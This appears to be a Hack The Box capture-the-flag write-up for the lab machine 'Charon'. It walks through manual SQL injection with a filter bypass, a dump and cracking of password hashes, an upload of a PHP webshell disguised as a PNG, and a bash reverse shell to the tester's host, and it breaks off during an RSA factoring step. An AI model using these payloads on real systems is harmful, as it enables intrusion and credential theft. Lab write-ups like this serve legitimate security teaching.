---
title: HTB: Charon
url: https://0xdf.gitlab.io/2021/02/16/htb-charon.html
date: 2021-02-16T10:00:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-charon, ctf, hackthebox, nmap, gobuster, sqli, injection, command-injection, filter, bash, waf, crackstation, upload, webshell, burp, burp-repeater, crypto, rsa, rsactftool, history, suid, ltrace, ghidra
---

![Charon](https://0xdfimages.gitlab.io/img/charon-cover.png)

Another 2017 box, but this one was a lot of fun. There’s an SQL injection the designed to break sqlmap (I didn’t bother to go into sqlmap, but once I finished saw from others). Then there’s a file upload, some crypto, and a command injection. I went into good detail on the manual SQLI and the RSA crypto. In Beyond Root, I’ll look at a second SQLI that didn’t prove usefu, and at the filters I had to bypass on the useful SQLI.

## Box Info

| Name | [Charon](https://hackthebox.com/machines/charon)  [Charon](https://hackthebox.com/machines/charon) [Play on HackTheBox](https://hackthebox.com/machines/charon) |
| --- | --- |
| Release Date | 07 Jul 2017 |
| Retire Date | 04 Nov 2017 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Charon |
| Radar Graph | Radar chart for Charon |
| First Blood User | 04:20:21[vagmour vagmour](https://app.hackthebox.com/users/82) |
| First Blood Root | 06:06:19[ReverseBrain ReverseBrain](https://app.hackthebox.com/users/630) |
| Creator | [decoder decoder](https://app.hackthebox.com/users/1391) |

## Recon

### nmap

`nmap` found two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.31
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 17:15 EST
Nmap scan report for 10.10.10.31
Host is up (0.012s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.31
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 17:15 EST
Nmap scan report for 10.10.10.31
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee (RSA)
|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec (ECDSA)
|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Frozen Yogurt Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu Xenial 16.04.

### Website - TCP 80

#### Site

The site is for a Frozen dessert company:

[![image-20210209173656189](https://0xdfimages.gitlab.io/img/image-20210209173656189.png)](https://0xdfimages.gitlab.io/img/image-20210209173656189.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210209173656189.png)

The various links of around the site lead to different HTML pages (`index.html`, `about.html`, `product.html`, and `blog.html`). There’s also a link under Blog for “Single Post”, which leads to `/singlepost.php?id=10`. There are posts at `id` 10, 11, and 12. It is confirmation that the site runs on PHP.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@parrot$ gobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o scans/gobuster-root-small-php -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.31
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/09 17:37:22 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/include (Status: 301)
/fonts (Status: 301)
/cmsdata (Status: 301)
===============================================================
2021/02/09 17:38:32 Finished
===============================================================

```

`/cmsdata` is interesting, but returns 403 forbidden. I’ll try another `gobuster` here:

```

oxdf@parrot$ gobuster dir -u http://10.10.10.31/cmsdata -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -o scans/gobuster-cmsdata-small-php -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.31/cmsdata
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/09 21:39:16 Starting gobuster
===============================================================
/images (Status: 301)
/login.php (Status: 200)
/scripts (Status: 301)
/menu.php (Status: 302)
/upload.php (Status: 302)
/css (Status: 301)
/js (Status: 301)
/include (Status: 301)
/forgot.php (Status: 200)
===============================================================
2021/02/09 21:40:20 Finished
===============================================================

```

`menu.php` and `upload.php` are interesting, but they both redirect to `login.php`.

#### login.php

This presents a login form:

![image-20210210055733938](https://0xdfimages.gitlab.io/img/image-20210210055733938.png)

I tried some basic standard guesses, but without any luck.

The “Forgot password?” link leads to `forgot.php` which has a single field form:

![image-20210210200431248](https://0xdfimages.gitlab.io/img/image-20210210200431248.png)

If I guess something that can’t be in the DB (like `0xdf@aol.com`), it returns:

![image-20210210200510132](https://0xdfimages.gitlab.io/img/image-20210210200510132.png)

I tried a few things that might be on Charon (`admin@charon.htb`, etc), but just got the same message back.

If I try something that isn’t an email, it returns a different message:

![image-20210210202615426](https://0xdfimages.gitlab.io/img/image-20210210202615426.png)

`a@b.c` is enough to pass as a valid email.

## Shell as www-data

### SQLI

#### Identify SQLI

In the password reset form, I tried `0xdf@aol.com'`, and the message changed:

![image-20210210200631048](https://0xdfimages.gitlab.io/img/image-20210210200631048.png)

That’s a promising sign for SQL injection.

#### Tradecraft

There’s a few ways to test. I could go into Burp Proxy’s history and send one of the POST requests to Repeater. That works, but the text I’m looking for is at the bottom of the page each time, which is kind of annoying to scroll through.

Looking at the error message, it’s at the very bottom of the returned HTML:

```

...[snip]...
        <h2> User not found with that email!    
  </body>
</html>

```

Same with the database error:

```

...[snip]...
        <h2> Error in Database!    
  </body>
</html>

```

And it seems to come right after the `<h2>` tag. I’ll move to `curl` piped into `grep '<h2>'`. The other thing that’s nice about `curl` is I can use the `--data-urlencode` field, which allows me to not worry about encoding the data, which makes it more readable.

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=0xdf@aol.com" | grep '<h2>'
        <h2> User not found with that email!
oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=0xdf@aol.com'" | grep '<h2>'
        <h2> Error in Database!

```

Now I can easily up arrow to get the previous command, modify it, and get the result in a single line.

#### Develop SQLI

The next thing I want to do is see if I can make a legit query. I’m guessing that the query looks something like:

```

SELECT * from users where email = '{input email}';

```

I can start with `' or 1=1;-- -`, which would make:

```

SELECT * from users where email = '' or 1=1;-- -';

```

That returns incorrect format, so I need to pass the email address check. Try `a@b.c' or 1=1;-- -`:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' or 1=1;-- -" | grep '<h2>'
        <h2> User not found with that email!

```

It’s not uncommon for this kind of search to fail with 0 rows or more than 1 row returned. I’ll try limiting the search to just one result:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' or 1=1 limit 1;-- -" | grep '<h2>'
        <h2> Email sent to: test1@aa.com=>test1

```

It worked! I got back an email and a likely username!

#### Enumerate Users

I can quickly turn this into a Bash loop to find all the users in the DB (though this step isn’t necessary, but it’s a useful explanation of my love of Bash one-liners). I’ll break this down here with extra spacing:

```

for i in {1..1000}; do 
    curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' or 1=1 limit ${i},1;-- -" 
    | grep '<h2>' 
    | awk '{print $5}' 
    | grep -v "^with" || break; 
done

```

I’ll loop over `$i` with some impossibly high number I don’t plan to hit (I had to make it higher than I expected). For each `$i`, I’ll query with the `limit` starting that the `$i`, and getting one result. That entire HTML page is pipped into a grep on the `<h2>` line to get the response message. That line will look something like:

```

        <h2> Email sent to: test175@aa.com=>test175

```

I really only want the email and username, so I’ll use `awk` to just print the fifth column. When I get past the last user, I’ll get lines like:

```

        <h2> User not found with that email!

```

When that is fed into `awk`, the result will be `with`. So I’ll do a `grep -v` to remove those lines. But since `grep -v` returns false when it matches, I can do `|| break` to exit the first time it matches, so I don’t have to finish the rest of the count.

In practice that looks like:

```

oxdf@parrot$ for i in {1..1000}; do curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' or 1=1 limit ${i},1;-- -" | grep '<h2>' | awk '{print $5}' | grep -v "^with" || break; done
test2@aa.com=>test2
test3@aa.com=>test3
test4@aa.com=>test4
test5@aa.com=>test5
test6@aa.com=>test6
test7@aa.com=>test7
...[snip]...
test198@aa.com=>test198
test199@aa.com=>test199
test200@aa.com=>test200
adm@nowhere.com=>super_cms_adm
decoder@nowhere.com=>decoder

```

#### Identify Filter / WAF

I’ll explain Union injection in the next section, but to start, I need to identify the number of columns coming back from the query being made. I’ll do that by starting with `UNION SELECT 1,2` (as I know there are at least two columns, email and username). If this matches the number of columns returned, I would see at least some of those values displayed back to me, but if not, it would cause a database error (like what I’ve seen already).

However, when I send the first test, I see nothing back. I’ll remove the grep, and the entire response is just “Error”:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' union select 1,2;-- -" | grep '<h2>'
oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' union select 1,2;-- -"
Error

```

That’s something different. This feels more like some kind of filtering / web application firewall (WAF). I can test this by putting some of the key words in different places and seeing what I get. For example, look at these two queries:

```

SELECT * from users where email = 'a@b.c';-- -';
SELECT * from users where email = 'a@b.c';-- -'; UNION

```

From an SQL point of view, they are exactly the same, as the `UNION` comes after the comment (`-- -`). But the site responds totally differently:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c';-- -" | grep '<h2>'
        <h2> User not found with that email!    
oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c';-- - UNION"
Error

```

`UNION` is clearly a bad word. However, `UNiON` isn’t:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c';-- - UNiON" | grep '<h2>'
        <h2> User not found with that email!

```

In fact, just that one character change allows the query I was trying to make in the first place:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,2;-- -" | grep '<h2>'
        <h2> Error in Database!

```

#### Find Union Injection

There’s not much I can do with those users, so back to enumerating the database. It looks like at least two fields are displayed back to me in the message. I’ll try Union Injection to read other parts of the database. `UNION` in SQL does two queries, and as long as they return the same number of columns, it stacks the rows from the first query on top of the rows from the second query. In this case, if I can make the first query (the intended query based on email address) return no rows, then I can build the row I want to actually return based on other queries.

The first task is to find the number of columns that match, and which fields are output. I already showed how two columns caused a mismatch. Three does as well, but with four, the message changes:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,2,3;-- -" | grep '<h2>'
        <h2> Error in Database!    
oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,2,3,4;-- -" | grep '<h2>'
        <h2> Incorrect format

```

“Incorrect format” was the error message when the result wasn’t an email address. I can guess that one of the four columns is the email address, so I’ll try something that meets that format in each column one at a time and see if any work:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 'a@b.c',2,3,4;-- -" | grep '<h2>'
        <h2> Incorrect format    
oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,'a@b.c',3,4;-- -" | grep '<h2>'
        <h2> Incorrect format    
oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,2,'a@b.c',4;-- -" | grep '<h2>'
        <h2> Incorrect format    
oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,2,3,'a@b.c';-- -" | grep '<h2>'
        <h2> Email sent to: a@b.c=>2   

```

The last one worked, and it’s also displaying `2` back, which means I can put data in that field and get it printed to me. For example, to get the DB version:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,version(),3,'a@b.c';-- -" | grep '<h2>'
        <h2> Email sent to: a@b.c=>5.7.18-0ubuntu0.16.04.1 

```

#### Enumerate DB

I’ll start by listing the databased in the database. These are kept int the `schema_name` column of the `information_schema.schemata` table. The first is the `information_schema` database:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,schema_name,3,'a@b.c' from information_schema.schemata limit 1;-- -" | grep '<h2>'
        <h2> Email sent to: a@b.c=>information_schema

```

I can do a similar loop as before:

```

oxdf@parrot$ for i in {0..100}; do curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,schema_name,3,'a@b.c' from information_schema.schemata limit ${i},1;-- -" | grep '<h2>' | awk '{print $5}' | grep -v "^with$" || break; done | cut -d'>' -f2
information_schema
supercms

```

But even cooler is the `GROUP_CONCAT` SQL function, which will combine an entire column into one result:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(schema_name),3,'a@b.c' from information_schema.schemata;-- -" | grep '<h2>'
        <h2> Email sent to: a@b.c=>information_schema,supercms 

```

Or made more pretty with `cut` and `tr`:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(schema_name),3,'a@b.c' from information_schema.schemata;-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
information_schema
supercms 

```

The query to get the tables in the supercms database would be:

```

SELECT table_name from information_schema.tables where table_schema="supercms"

```

Translated into the injection, that looks like:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(table_name),3,'a@b.c' from information_schema.tables where table_schema='supercms';-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
groups
license
operators

```

I can list the columns from each table:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(column_name),3,'a@b.c' from information_schema.columns where table_name='groups';-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
grpid
userid    

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(column_name),3,'a@b.c' from information_schema.columns where table_name='license';-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
id
license_key    

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(column_name),3,'a@b.c' from information_schema.columns where table_name='operators';-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
id
__username_
__password_
email  

```

With `group_concat` and `concat` together I can build a single query that dumps the usernames and passwords, but it must hit some kind of max response length:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(concat(__username_, ':', __password_)),3,'a@b.c' from operators ;-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
test1:5f4dcc3b5aa765d61d8327deb882cf99
test2:5f4dcc3b5aa765d61d8327deb882cf99
test3:5f4dcc3b5aa765d61d8327deb882cf99
test4:5f4dcc3b5aa765d61d8327deb882cf99
test5:5f4dcc3b5aa765d61d8327deb882cf99
test6:5f4dcc3b5aa765d61d8327deb882cf99
test7:5f4dcc3b5aa765d61d8327deb882cf99
test8:5f4dcc3b5aa765d61d8327deb882cf99
test9:5f4dcc3b5aa765d61d8327deb882cf99
test10:5f4dcc3b5aa765d61d8327deb882cf99
test11:5f4dcc3b5aa765d61d8327deb882cf99
test12:5f4dcc3b5aa765d61d8327deb882cf99
test13:5f4dcc3b5aa765d61d8327deb882cf99
test14:5f4dcc3b5aa765d61d8327deb882cf99
test15:5f4dcc3b5aa765d61d8327deb882cf99
test16:5f4dcc3b5aa765d61d8327deb882cf99
test17:5f4dcc3b5aa765d61d8327deb882cf99
test18:5f4dcc3b5aa765d61d8327deb882cf99
test19:5f4dcc3b5aa765d61d8327deb882cf99
test20:5f4dcc3b5aa765d61d8327deb882cf99
test21:5f4dcc3b5aa765d61d8327deb882cf99
test22:5f4dcc3b5aa765d61d8327deb882cf99
test23:5f4dcc3b5aa765d61d8327deb882cf99
test24:5f4dcc3b5aa765d61d8327deb882cf99
test25:5f4dcc3b5aa765d61d8327deb882cf99
test26:5f4dcc3b5aa765d61d8327de

```

That’s ok, I can use `WHERE` in the SQL to get rid of those. I’ll check two ways - first for users that don’t start with `test`, and then for users that don’t have that password hash starting with `5f4dcc3b`:

```

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(concat(__username_, ':', __password_)),3,'a@b.c' from operators where __username_ NOT LIKE 't%';-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
super_cms_adm:0b0689ba94f94533400f4decd87fa260
decoder:5f4dcc3b5aa765d61d8327deb882cf99

oxdf@parrot$ curl -s http://10.10.10.31/cmsdata/forgot.php --data-urlencode "email=a@b.c' UNiON SELECT 1,group_concat(concat(__username_, ':', __password_)),3,'a@b.c' from operators where __password_ != '5f4dcc3b5aa765d61d8327deb882cf99';-- -" | grep '<h2>' | cut -d'>' -f3 | tr ',' '\n'
super_cms_adm:0b0689ba94f94533400f4decd87fa260 

```

### Crack Passwords

Before loading Hashcat, I’ll always check some online resources to see if the compute has already been done. These are 32 hex characters, which suggests MD5 hash, so it’s quite likely that they are already broken if they are meant to be broken. [CrackStation](https://crackstation.net/) has both:

![image-20210211061331042](https://0xdfimages.gitlab.io/img/image-20210211061331042.png)

### Upload Webshell

#### Access CMS

At the login page, logging in as decoder this:

![image-20210211061440531](https://0xdfimages.gitlab.io/img/image-20210211061440531.png)

The login works, as an editor role, but there are no options.

The test accounts have no role, and don’t even get the empty list of options:

![image-20210211061627420](https://0xdfimages.gitlab.io/img/image-20210211061627420.png)

super\_cms\_adm has the administrators role, and options:

![image-20210211061804995](https://0xdfimages.gitlab.io/img/image-20210211061804995.png)

I can update the various static HTML pages on the site, but that doesn’t buy me too much. If I had no other ideas, I could try putting some malicious javascript on the page and see if an admin visits and requests it from my site, but that doesn’t seem likely in this case.

#### Enumerate Upload

The other link is to “Upload Image File”, which goes to `upload.php`:

![image-20210211062234241](https://0xdfimages.gitlab.io/img/image-20210211062234241.png)

When I select an image and push “Submit Query”, it sends a POST request to `upload.php`, and the response tells me where the image is:

![image-20210211062356609](https://0xdfimages.gitlab.io/img/image-20210211062356609.png)

My image is at `http://10.10.10.31/images/image-20201109063341108.png`.

#### Bypass Filter

I’ll work with a small webshell, `cmd.php`:

```

<?php system($_REQUEST["cmd"]); ?>

```

If I try to upload `cmd.php`, it pops a message box:

![image-20210211062849149](https://0xdfimages.gitlab.io/img/image-20210211062849149.png)

This is done without any requests being sent to the server, so it’s coming from local JavaScript.

I’ll change the name of the small webshell to `cmd.jpg`, turn on Burp intercept, and upload it. The request looks like:

```

POST /cmsdata/upload.php HTTP/1.1
Host: 10.10.10.31
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------15172911769797472052954530234
Content-Length: 253
Origin: http://10.10.10.31
DNT: 1
Connection: close
Referer: http://10.10.10.31/cmsdata/upload.php
Cookie: PHPSESSID=488jcl3fcrq3ve898p14t9v682
Upgrade-Insecure-Requests: 1
-----------------------------15172911769797472052954530234
Content-Disposition: form-data; name="image"; filename="cmd.jpg"
Content-Type: image/jpeg

<?php system($_REQUEST["cmd"]); ?>
-----------------------------15172911769797472052954530234--

```

I’ll change the `filename` back to `cmd.php`, and then forward the request, but it returns an error:

![image-20210211064107512](https://0xdfimages.gitlab.io/img/image-20210211064107512.png)

There are three ways that a server typically filters on file type:
- File extension
- Content-Type
- Magic bytes / MIME type

I’m already submitting this with a `Content-Type: image/jpeg`, so it must be more than that. The message suggests it’s restricting on extension. If I just upload `cmd.jpg` and don’t change the name, it still complains:

![image-20210211064327901](https://0xdfimages.gitlab.io/img/image-20210211064327901.png)

Based on this, I think it’s filtering on both the given extension and the [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures). I have another short webshell that starts off with the header of a PNG file, but then is a webshell:

```

oxdf@parrot$ cat /opt/shells/php/cmd.php.png 
PNG

IHDS( IDATxw\
nQVjVVڴs<,9r
"
A
<?php system($_REQUEST["cmd"]); ?>

```

The file command will show this as a PNG file:

```

oxdf@parrot$ file /opt/shells/php/cmd.php.png
/opt/shells/php/cmd.php.png: PNG image data, 1478 x 540, 8-bit/color RGB, non-interlaced

```

It uploads!

![image-20210211064605313](https://0xdfimages.gitlab.io/img/image-20210211064605313.png)

However, because it’s a `.png`, the server isn’t executing it as PHP code:

```

oxdf@parrot$ curl http://10.10.10.31/images/cmd.php.png -o-
PNG

IHDS( IDATxw\
nQVjVVڴs<,9r
"
A
<?php system($_REQUEST["cmd"]); ?>

```

#### Filename

Looking at the page source for the form, there’s a commented out form field:

```

<form action="upload.php" method="POST" onsubmit="javascript:return ValidateImage(this);" name="frm" enctype="multipart/form-data">
<input type="file" name="image" />
<!-- <input type=hidden name="dGVzdGZpbGUx"> -->
<input type="submit"/>
</form>

```

I’ll set Burp to intercept responses and refresh `upload.php`. I’ll edit the response so this field is no longer commented out.

This time when I try to upload an image, there’s an additional field submitted (empty):

```

POST /cmsdata/upload.php HTTP/1.1
Host: 10.10.10.31
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------308256804225396707191772294964
Content-Length: 13251
Origin: http://10.10.10.31
DNT: 1
Connection: close
Referer: http://10.10.10.31/cmsdata/upload.php
Cookie: PHPSESSID=488jcl3fcrq3ve898p14t9v682
Upgrade-Insecure-Requests: 1
-----------------------------308256804225396707191772294964
Content-Disposition: form-data; name="image"; filename="image-20201109063341108.png"
Content-Type: image/png

PNG
...[snip]...
----------------------------308256804225396707191772294964
Content-Disposition: form-data; name="dGVzdGZpbGUx"
-----------------------------308256804225396707191772

```

The result is still the same.

![image-20210211065207444](https://0xdfimages.gitlab.io/img/image-20210211065207444.png)

I’ll send that request over to repeater, and try adding some a value to the new form item, but still nothing changed.

The field name is a bit weird, and it looks like it could be base64-encoded:

```

oxdf@parrot$ echo "dGVzdGZpbGUx" | base64 -d
testfile1

```

If I try that as the name of the field instead of “dGVzdGZpbGUx”, something interesting happens:

![image-20210211065544989](https://0xdfimages.gitlab.io/img/image-20210211065544989.png)

It saved the file as `../images/[my input]`. Changing `test` to `cmd.php` works as well:

![image-20210211065641944](https://0xdfimages.gitlab.io/img/image-20210211065641944.png)

In this test, I’ve been using a legit image, but I’ll hack away much of it, and replace it with a webshell:

![image-20210211065756109](https://0xdfimages.gitlab.io/img/image-20210211065756109.png)

The webshell works:

```

oxdf@parrot$ curl http://10.10.10.31/images/cmd.php -d "cmd=id" -o-
PNG

IHDR-] IDATxy|R09-      T       `-QQ ̰
uid=33(www-data) gid=33(www-data) groups=33(www-data)
@B$ @B$ @B$ @B$ @B$ @Q%IENDB`

```

### Shell

To trigger a reverse shell, I’ll use the common Bash reverse shell:

```

oxdf@parrot$ curl http://10.10.10.31/images/cmd.php -d "cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.8/443 0>%261'"

```

I need to encode the `&` lest the server interpret them as a new parameter. At `nc`, a shell returns:

```

oxdf@parrot$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.31] 60846
bash: cannot set terminal process group (1305): Inappropriate ioctl for device
bash: no job control in this shell
www-data@charon:/var/www/html/freeeze/images$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll upgrade my shell using the normal method:

```

www-data@charon:/var/www/html/freeeze/images$ python -c 'import pty;pty.spawn("bash")'
<ml/freeeze/images$ python -c 'import pty;pty.spawn("bash")'                  
www-data@charon:/var/www/html/freeeze/images$ ^Z
[1]+  Stopped                 sudo nc -lnvp 443
oxdf@parrot$ stty raw -echo ; fg
sudo nc -lnvp 443
                 reset
reset: unknown terminal type unknown
Terminal type? screen
                                                                         
www-data@charon:/var/www/html/freeeze/images$ 

```

## Shell as decoder

### Enumeration

There’s a single directory in `/home` for user decoder. I can’t access `user.txt`, but there are two other files of interest:

```

www-data@charon:/home/decoder$ ls -l
total 12
-rw-r--r-- 1 decoder freeeze 138 Jun 23  2017 decoder.pub
-rw-r--r-- 1 decoder freeeze  32 Jun 23  2017 pass.crypt
-r-------- 1 decoder freeeze  33 Jun 23  2017 user.txt

```

`decoder.pub` is a public key, and `pass.crypt` is binary junk (shown with `xxd` as a hexdump):

```

www-data@charon:/home/decoder$ cat decoder.pub 
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
mI9wJizmFJhrAgMBAAE=
-----END PUBLIC KEY-----
www-data@charon:/home/decoder$ xxd pass.crypt 
00000000: 9932 4fad 5362 89a1 e2d1 8dd0 2265 cd7f  .2O.Sb......"e..
00000010: 1557 9d67 9c89 dd19 54c8 c56f 378d 1149  .W.g....T..o7..I

```

I’ll make copies of each file on my local vm. I can just copy `decoder.pub` using my clipboard. I’ll base64-encode `pass.crypt`:

```

www-data@charon:/home/decoder$ base64 pass.crypt 
mTJPrVNiiaHi0Y3QImXNfxVXnWecid0ZVMjFbzeNEUk=

```

Then on my local machine:

```

oxdf@parrot$ echo "mTJPrVNiiaHi0Y3QImXNfxVXnWecid0ZVMjFbzeNEUk=" | base64 -d > pass.crypt

```

### Manual Crypt

#### RSA Theory

RSA encryption involves a key pair. Typically the two keys are referred to as the public key and the private key. The public key is really just two numbers, `n` and `e`. The private key is also two numbers, `n` and `d`. To encrypt a message, convert that into an int, `M`, and then

\[ciphertext=M^d \pmod n\]

To decrpy the message, I’ll raise the ciphertext to `e` (from the public key) mod `n`:

\[M = ciphertext^e \pmod n\]

This only works with specific `e`, `d`, and `n`. `n` will be the product of two large prime numbers. If I can factor `n`, I can calculate `d` (and thus have the private key).

#### Find Constants

As I’ll be working in a Python REPL for the math, I’ll use that to load the public key:

```

oxdf@parrot$ python3
Python 3.9.1+ (default, Jan 20 2021, 14:49:22) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.PublicKey import RSA
>>> with open('decoder.pub', 'r') as f:
...     key = RSA.importKey(f.read())
... 
>>> key.n
85161183100445121230463008656121855194098040675901982832345153586114585729131
>>> key.e
65537

```

That `n` looks really small. For comparison, I just created a dummy default key pair using `ssh-keygen`:

```

>>> with open('/home/oxdf/.ssh/id_rsa.pub', 'r') as f:
...     example_key = RSA.importKey(f.read())
... 
>>> example_key.n
4731656126845456667203322287986354010687695045579418979877195533448428735674292486804098672743083020235459379652529569457210771552689361468921861252483038952899565898794495397519763433865405796376277583939468245134677250169072778314532014995721812535849438587011594895030447269948975535320599194900185687994784558535118728170430329479390637929649837417596209306834691471205474032001463665177811101264622988728847054031163566378388205005216361880506066041615990401921210983814462107017896724941280713882033010088097804278224870192859660256741585787176091408347784823774188102157674909872437488008669572473799572149290366646475342912462327141465455891635482175203779804346773137416408130026814951723489128362122264891116437453092445143084570252330126588995786649219182286379511967504080260630439248788462813873725604631192964849612425213111413172722150930214004820825485863623971060136344106940664921953635772030179305984227263

```

There are attacks for trying to factor smaller numbers like this, but first I’ll check [factordb](http://factordb.com/index.php?query=85161183100445121230463008656121855194098040675901982832345153586114585729131), and it has the factors:

![image-20210211104311995](https://0xdfimages.gitlab.io/img/image-20210211104311995.png)

Those two numbers will be called `p` and `q` (doesn’t matter which is which). To calculate `d`, I need to solve:

\[d\*e \pmod \phi \equiv 1\]

Where

